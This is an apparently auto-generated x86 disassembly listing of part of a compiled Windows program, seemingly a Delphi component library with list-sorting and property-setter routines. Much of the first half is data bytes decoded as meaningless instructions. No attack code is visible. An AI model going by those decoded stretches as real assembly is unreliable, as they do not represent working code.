add [ eax ] al
add [ eax ] al
add [ ebx + 0x439644c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xchg esi eax
inc ebx
add al bl
outsb
je r-xdata
inc ecx
add ah bh
mov [ 0x19080043 ] al
inc edx
add [ esp + ecx * 4 - 0x6667ffbb ] cl
mov esp 0xc0004593
adc al [ edx ]
and al 0x8f
outsd
je r-xdata
add [ 0x6e756f43 ] eax
je r-xdata
push esp
inc ebx
jne r-xdata
jb r-xdata
jbe r-xdata
adc [ eax ] al
push es
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] 0x98e4c08b
inc ebx
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
je r-xdata
xchg esp eax
inc ebx
add al al
add [ eax ] al
push ebx
push 0x4374726f
jne r-xdata
add bh bh
sbb [ eax + 0x10045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
push [ eax ]
movsb [ edi ] [ esi ]
insd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : ebp + 0x64 ] si
insb
jbe r-xdata
add [ edx * 4 + 0x103c0043 ] bh
dec ecx
outsb
je r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
xchg ebp eax
je r-xdata
add [ eax ] al
aam 0x99
insd
inc ebp
jbe r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add [ edi + 0x880045 ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
rol [ eax ] 0x0
jae r-xdata
popad
jb r-xdata
xchg esp eax
0x9ac80045 0x45
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
adc dl [ ebx + 0x65 ]
arpl [ edi + 0x6e ] bp
inc ebx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
outsb
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6b ] al
jb r-xdata
add [ eax + eax - 0x70 ] 0xffffffc8
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ eax ] al
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebp + edx * 4 + 0x41 ] bl
clc
jb r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
cmp [ ecx + 0x10045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x6c656c62
xchg ebp eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000d ] al
outsb
inc edi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x4396
je r-xdata
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
inc eax
cmp al 0x95
inc ebx
add [ eax + edx ] bh
push ebx
je r-xdata
inc ebx
add [ eax ] dl
push esp
inc ebx
add ah cl
push ss
inc edx
xor al 0x40
add [ eax + edx ] cl
cld
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
xor al 0x40
je r-xdata
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
outsd
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
mov [ eax ] al
jae r-xdata
je r-xdata
add al 0x49
dec ecx
je r-xdata
je r-xdata
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
add [ fs : eax ] al
je r-xdata
jl r-xdata
add [ eax ] al
je r-xdata
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add al cl
pop esp
xor al [ eax ]
pop esp
xchg ebp eax
inc ecx
insd
adc [ esp + ecx * 2 + 0x69 ] dl
add ah bh
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ eax - 0x66 ] ch
inc ecx
add [ esi ] ch
inc ebx
add [ eax ] ah
0xa7c00041 0x43
pushad
xchg esi eax
inc ecx
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x80000000 ] al
loopne r-xdata
insd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
xor [ esi + 0x10045 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ecx + ebp * 4 ] bh
inc ebx
add [ ebx + edx * 4 + 0x12c00045 ] bh
inc edx
add [ edi + ecx * 4 ] ah
or al 0x10
insd
jae r-xdata
inc ecx
add ah bl
xchg esi eax
inc ecx
add [ edi + ebx * 4 + 0x54100043 ] dl
0xa62c0041 0x43
and [ edx - 0x583fffbf ] bl
inc ebx
add [ eax - 0x6a ] ah
outsd
insb
dec ecx
je r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
enter 0x0 0xff
pushfd
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jae r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
les ebx [ edx + 0x11070043 ]
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x2c0043 ] bh
add [ eax ] al
mov eax 0xf0004392
xor al 0x40
inc eax
add ah dl
cdq
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
xchg ebp eax
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
insd
add [ edx * 4 + 0x103c0043 ] bh
inc eax
add [ ecx + edx * 4 + 0x43 ] bh
add [ ebx + 0x439990c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
cdq
inc ebp
add [ eax + eax - 0x5bcf0100 ] ah
pop edx
inc ecx
add [ eax + eax - 0x672b0100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
js r-xdata
js r-xdata
jo r-xdata
je r-xdata
inc ecx
add ah bh
mov [ 0x19080043 ] al
inc edx
add [ esp + ecx * 4 - 0x6667ffbb ] cl
inc ebp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add ah bl
test al 0x43
add al cl
sbb [ edx ] eax
insb
sbb [ edx ] eax
clc
mov [ 0x19300043 ] al
inc edx
add [ eax - 0x1fffbc5f ] bl
lea eax [ ebp ]
rcl [ edi - 0x68a7ffbb ] 0x45
add ah ch
0xa96c0045 0x43
in al 0xa9
inc ebx
add [ eax ] bl
stosb [ edi ]
inc ebx
add ah bl
test eax 0x54110043
push ebx
je r-xdata
test eax 0x93bc0043
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
insd
sub al 0x94
inc ebx
jne r-xdata
add [ eax + 0x49060008 ] al
insd
popad
cdq
inc ebx
add al dl
add [ eax ] al
dec [ eax ]
stosb [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ eax ] al
jl r-xdata
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
dec eax
pop edx
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
push [ eax ]
xchg esi eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add ah bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
popfd
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esp + eax * 4 + 0x34f00044 ] bl
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x5bffbde9 ] bh
in eax dx
inc esp
add ah ch
pop ss
inc edx
add [ eax + 0x7c0044b7 ] dh
stosb [ edi ]
inc ebx
add [ eax + edi * 4 + 0x44 ] bl
add [ eax + 0x17 ] dh
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add [ edi + 0x880045 ] al
inc ebx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
xchg esp eax
fadd [ esi - 0x6593ffbb ]
inc ebp
add [ edx + ebx * 4 - 0x6537ffbb ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
insd
add bh bh
sbb [ eax + 0x10045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
push [ eax ]
movsb [ edi ] [ esi ]
dec eax
xchg esp eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
0x953c0043 0x43
adc al [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
inc ebp
add al al
adc al [ edx ]
and al 0x8f
xchg ebx eax
insd
jae r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
jo r-xdata
popad
je r-xdata
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
xchg [ ebp ] eax
push ebx
push 0x4374726f
jne r-xdata
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
add [ esi ] al
bound ebp [ ebp - 0x20 ]
cwde
inc ebx
add al bl
add [ eax ] al
pop es
inc ebx
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
arpl [ esi + ebp * 2 + 0x73 ] si
sldt [ eax ]
adc [ eax ] al
mov al [ 0x30ff0000 ]
mov [ 0x10043 ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cdq
inc ebx
add [ ebx + edx * 4 + 0x43 ] al
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
xor edx edx
push ebp
push sub_439e6f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add al cl
in eax dx
inc esp
add [ eax + 0x440044b8 ] cl
mov bh 0x44
add [ edx + edx * 4 - 0x6d3fffbb ] ch
inc ebp
add [ edi + esi * 4 + 0x44 ] bh
add al ch
xchg edx eax
inc ebp
add al bl
mov bh 0x44
add al dh
xchg edx eax
inc ebp
add al bh
mov bh 0x44
add al bh
xchg edx eax
inc ebp
add al dl
in eax dx
inc esp
add ah ch
mov eax 0xb92c0044
inc esp
add [ eax ] bl
mov eax 0x930c0044
inc ebp
add [ eax ] dl
xchg ebx eax
inc ebp
add [ eax + edi * 4 ] bh
inc esp
add [ ebp + esi * 4 - 0x55c3ffbc ] ch
inc ebx
add al al
stosb [ edi ]
inc ebx
add [ eax - 0x56 ] dl
inc ebx
add [ ebx + ebp * 4 ] ch
inc ebx
add [ esp + ebp * 4 - 0x537bffbd ] dh
inc ebx
add [ eax + 0xf0043ac ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xchg edx eax
inc ebp
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ esi + esi * 4 - 0x6dcbffbc ] bl
inc ebp
add [ eax ] dl
mov bh 0x44
add [ edx + edx * 4 + 0x45 ] bl
add al 0x18
nop
dec esp
popfd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
0xe00043 0x0
add [ eax - 0x66 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
0x43 0x0
retn
mov edx [ eax ]
call [ edx + 0x24 ]
or eax 0x69560700
jae r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
cmp [ ecx + 0x10045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sub_439df4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_439e6f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_439e8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41932c
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_439ec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4042f8
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4193d0
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_40408c
pop esi
pop ebx
retn
sub_439f28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43a0c0
push eax
mov edx esi
mov eax ebx
call sub_43a0c0
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_439f64
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_419748
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_419748
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_43a02c
sub_439f94
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_40810c
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_4080d4
jmp r-xdata
pop ebx
retn
sub_439fd0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a0c0
mov ebp eax
mov edx edi
mov eax ebx
call sub_43a0c0
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_43a0c0
call sub_4193b8
mov esi eax
mov edx edi
mov eax ebx
call sub_43a0c0
call sub_4193b8
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43a02c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439fd0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a02c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43a0f8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419a90
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43a140
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459318
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_459630
mov dl 0x1
mov eax esi
call sub_43a330
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43a198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_43a2b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403458
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4188d4
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4188d4
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_43a2c0
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_43a2fc
push ebx
mov ebx eax
mov eax ebx
call sub_421398
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_43a330
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43a430
sub_43a330
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43a49c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_43a3fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4188d4
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_43a430
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_43a49c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_43a4fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_43a54c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405df8
